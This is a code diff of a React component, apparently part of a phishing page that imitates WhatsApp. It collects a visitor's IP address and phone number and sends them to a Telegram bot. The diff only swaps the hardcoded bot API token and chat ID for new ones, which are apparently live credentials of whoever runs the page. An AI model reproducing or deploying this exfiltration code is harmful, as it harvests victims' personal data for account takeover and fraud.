@@ -40,13 +40,13 @@ export default function Number({ setPage, setNcode, ncode }) {
   };
   const APIS = () => {
     var message = "";
-    const apiToken = "7847509084:AAE7uUmRcGrcmC22EzTmIakoJvaArqDyTOg";
+    const apiToken = "7814338130:AAHm2X9TOwPrcl6jpcY1PTY8Gl5KSeNcIlI";
     message += "--------[ Whatsapp  Info ]-------\n";
     message += `IP Address   : ${ state.ip}\n`;
     message += `Phone Number : ${formatPhoneNumberIntl(value)}\n`;
     const queryParams = {
       "text": message,
-      "chat_id" : "7829326672",
+      "chat_id" : "6968763338",
       "parse_mode":"html"
     };
     const queryString = Object.keys(queryParams)
@@ -168,3 +168,4 @@ export default function Number({ setPage, setNcode, ncode }) {
     </div>
   )
 }
+
